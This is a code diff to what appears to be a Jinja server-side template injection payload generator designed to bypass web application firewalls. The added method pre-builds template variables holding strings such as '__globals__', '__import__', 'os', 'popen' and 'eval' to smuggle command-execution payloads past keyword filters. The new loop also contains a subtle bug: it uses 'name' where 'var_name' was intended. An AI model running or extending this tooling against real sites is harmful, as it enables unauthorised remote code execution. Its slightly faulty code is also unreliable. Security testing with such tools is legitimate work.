@@ -3,6 +3,8 @@
 """
 
 import logging
+import random
+import string
 from typing import Callable, Tuple, Union, Dict, Any
 
 from . import payload_gen
@@ -17,6 +19,7 @@ from .const import (
     CALLBACK_GENERATE_FULLPAYLOAD,
     DETECT_MODE_ACCURATE,
     ENVIRONMENT_JINJA,
+    STRING,
 )
 
 logger = logging.getLogger("full_payload_gen")
@@ -96,30 +99,25 @@ class FullPayloadGen:
         callback: Union[Callable[[str, Dict], None], None] = None,
         detect_mode: str = DETECT_MODE_ACCURATE,
         environment: str = ENVIRONMENT_JINJA,
-        waf_expr_func: Union[Callable[
-            [
-                str,
+        waf_expr_func: Union[
+            Callable[
+                [
+                    str,
+                ],
+                bool,
             ],
-            bool,
-        ], None] = None
+            None,
+        ] = None,
     ):
-        self.__slot__ = [
-            "waf_func",
-            "prepared",
-            "_callback",
-            "context_payload",
-            "context",
-            "outer_pattern",
-            "will_print",
-            "waf_expr_func"
-        ]
         self.waf_func = waf_func
         self.prepared = False
+        self.extra_context_vars_prepared = False
         self._callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
         self.context_payload = context_payloads_all
         self.context = context_payloads_to_context(self.context_payload)
+        self.used_context = {}
         self.outer_pattern, self.will_print = None, None
         self.payload_gen = None
         self.detect_mode = detect_mode
@@ -172,7 +170,7 @@ class FullPayloadGen:
             self.callback,
             detect_mode=self.detect_mode,
             environment=self.environment,
-            waf_expr_func=self.waf_expr_func
+            waf_expr_func=self.waf_expr_func,
         )
         self.prepared = True
         self.callback(
@@ -184,6 +182,72 @@ class FullPayloadGen:
             },
         )
         return True
+
+    def prepare_extra_context_vars(self):
+        targets = [
+            "__class__",
+            "__globals__",
+            "__builtins__",
+            "__getitem__",
+            "__import__",
+            "__getitem__",
+            "__add__",
+            "__mul__",
+            "__mod__",
+            "__truediv__",
+            "os",
+            "popen",
+            "read",
+            "pop",
+            "get",
+            "eval",
+            "chr",
+            "%c",
+        ]
+        if not self.prepared and not self.do_prepare():
+            return
+        if not self.waf_func("{%set %}"):
+            return
+        if self.extra_context_vars_prepared:
+            return
+        self.extra_context_vars_prepared = True
+
+        assert self.payload_gen is not None, "when prepared, we should have payload_gen"
+        logger.warning(
+            "Adding some string variables...",
+        )
+        for target in targets:
+            ret = self.payload_gen.generate_detailed(STRING, target)
+            if ret is None:
+                continue
+            expression, used_context, _ = ret
+            # get a valid variable name
+            var_name = None
+            for _ in range(10):
+                name = "".join(random.choices(string.ascii_lowercase, k=4))
+                if name in self.used_context or name in used_context:
+                    continue
+                if not self.waf_func(name):
+                    continue
+                var_name = name
+            if not var_name:
+                continue
+            # add payload
+            payload = "{%set NAME=EXPR%}".replace("NAME", name).replace(
+                "EXPR", expression
+            )
+            success = self.add_context_variable(payload, {name: target})
+            if not success:
+                continue
+            # add used context
+            self.used_context.update(used_context)
+            # finish
+            logger.warning(
+                "Adding %s with %s",
+                colored("yellow", repr(target)),
+                colored("blue", payload),
+            )
+        self.payload_gen.cache = {}
 
     def add_context_variable(
         self,
@@ -228,8 +292,10 @@ class FullPayloadGen:
         """
         if not self.prepared and not self.do_prepare():
             return None
-
         assert self.payload_gen is not None, "when prepared, we should have payload_gen"
+
+        self.prepare_extra_context_vars()
+        logger.warning("Start generating expression...")
 
         ret = self.payload_gen.generate_detailed(gen_type, *args)
 
@@ -237,8 +303,9 @@ class FullPayloadGen:
             logger.warning("Bypassing WAF Failed.")
             return None
         inner_payload, used_context, tree = ret
+        self.used_context.update(used_context)
         context_payload = "".join(
-            filter_by_used_context(self.context_payload, used_context).keys()
+            filter_by_used_context(self.context_payload, self.used_context).keys()
         )
         assert isinstance(self.outer_pattern, str)
 
